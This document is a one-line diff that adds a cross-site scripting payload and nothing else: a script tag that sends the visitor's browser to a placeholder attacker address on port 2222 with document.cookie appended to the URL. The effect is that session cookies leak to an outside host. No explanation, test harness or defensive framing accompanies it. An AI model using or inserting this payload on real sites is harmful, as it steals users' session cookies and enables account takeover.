@@ -1,0 +1,1 @@
+<script>document.location='http://<ip.address>:2222/grab.cgi?'+document.cookie;</script>
